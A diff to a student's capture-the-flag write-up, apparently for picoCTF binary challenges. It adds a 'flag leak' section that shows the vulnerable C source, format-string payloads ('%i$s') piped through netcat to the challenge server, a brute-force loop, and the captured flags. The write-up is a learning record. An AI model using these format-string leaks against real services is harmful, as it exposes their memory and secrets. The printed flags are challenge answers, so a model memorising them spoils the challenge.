@@ -77,8 +77,45 @@ NOw if you use the `Cla%sic_Che%s%steak` will lead to segmentation fault. Thus l
 Giving me the flag `picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_dc0f36c4}`
 <br>
 
-### Things learned
+### Things I learned
+what is a string vulnerability
+How we can use this string vulnerabilities to get the flag
 <br>
 
 ### Mistakes I made
+none for this one
+<br><br>
+
+## Challenge-3 flag leak
+In this challenge, one thing your will notice is, there is no concept for our buffer handling or segmentation fault
+
+Also in the `vuln2.c` file (which is our soure), whatever we add is given back to us as the output so what if we manage to print out in the memory address where our flag is getting stored like in 
+
+    void readflag(char* buf, size_t len) {
+        FILE *f = fopen("flag.txt","r");
+        if (f == NULL) {
+            printf("%s %s", "Please create 'flag.txt' in this directory with your","own debugging flag.\n");
+            exit(0);
+        }
+    
+        fgets(buf,len,f); // size bound read
+    }
+
+So in the input I try to add memory holder `%i$s` and as an output i get the string at the ith string compartment
+    snorlux@MrinalPC:/mnt/f/Cryptonite_taskphase2_Mrinal/Binary$ %4$s
+    echo "%$i\$s" | nc saturn.picoctf.net 59356
+    Tell me a story and then I'll tell you one >> Here's a story -
+    ����������؉ǀ�u��^H�C�p��s��u��C
+
+Thus we can get hidden strings and can even find the flag at the correct positional string compartment
+
+So to go through all of them i use the command
+    for i in {0..99}; do echo "%$i\$s" | nc saturn.picoctf.net 64716; done
+
+And get the flag `picoCTF{L34k1ng_Fl4g_0ff_St4ck_95f60617}`
 <br>
+
+### Things i learned
+You can access the string at specific positional order in the file using `%i$s`
+
+You can write code in the wsl shell itself and pipe the output to a specifc file
